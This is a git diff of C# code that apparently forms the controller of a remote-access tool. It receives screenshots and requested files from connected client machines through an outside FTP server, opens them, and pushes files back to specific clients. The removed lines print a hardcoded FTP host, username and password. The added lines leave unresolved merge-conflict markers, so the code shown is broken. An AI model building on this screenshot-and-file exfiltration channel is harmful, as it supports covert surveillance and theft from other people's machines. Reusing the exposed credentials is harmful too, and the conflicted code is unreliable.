@@ -96,6 +96,7 @@ namespace k3rn3lpanicTools
                 stream.Write(bytes, 0, bytes.Length);
             }
         }
+        
         private async static void TakeCareOfTCPclient(TcpClient ParamClient, RichTextBox l, ListBox ls)
         {
             NetworkStream stream = null;
@@ -141,14 +142,22 @@ namespace k3rn3lpanicTools
                         l.Text += recivedtext;
                         if (recivedtext.StartsWith("File Sent."))
                         {
-                            new FTPClient("ftp://3287871599.cloudylink.com", "frdiuh", "T63NyMC9Zmkh7w", false).DoWork("capt.jpg");
+<<<<<<< HEAD
+                        new FTPClient(FTPinfo.domain, FTPinfo.username, FTPinfo.password, true).DoWork("capt.jpg","capt.panic");
+=======
+                            new FTPClient("ftp://", "username", "password", false).DoWork("capt.jpg");
+>>>>>>> 4ed9aec1d4f00b816b4bf2aaec2b31d086517fa7
                             l.Text += "\nFile Saved : capt.panic";
                             System.Diagnostics.Process.Start("capt.jpg");
                         }
                         else if (recivedtext.StartsWith("FileReqsent-"))
                         {
                         string nametosave = recivedtext.Substring(12);
-                        new FTPClient("ftp://3287871599.cloudylink.com", "frdiuh", "T63NyMC9Zmkh7w", false).DoWork(Path.GetFileName(nametosave));
+<<<<<<< HEAD
+                        Tools.DownloadFromFTP(FTPinfo.domain, FTPinfo.username, FTPinfo.password, nametosave, "client.panic");
+=======
+                        new FTPClient("ftp://", "username", "password", false).DoWork(Path.GetFileName(nametosave));
+>>>>>>> 4ed9aec1d4f00b816b4bf2aaec2b31d086517fa7
                         l.Text += "\nSaved File.";
                         System.Diagnostics.Process.Start(nametosave);
                         }
@@ -247,6 +256,20 @@ namespace k3rn3lpanicTools
             {
                 Console.WriteLine(ex.Message);
             }
+        }
+        public static void SendFileToClient(string clientname,string filename,RichTextBox l)
+        {
+            if (!File.Exists(filename))
+            {
+                l.Text += "\n404 File not Found!";
+                return;
+            }
+            if(Tools.UploadFiletoFTP(FTPinfo.domain,FTPinfo.username,FTPinfo.password,filename, "client.panic"))
+            {
+                SendStrToSpecificClient(clientname, "newfilesent-" + Path.GetFileName(filename));
+            }
+
+            //TCPCLS[clientname];
         }
     }
 }
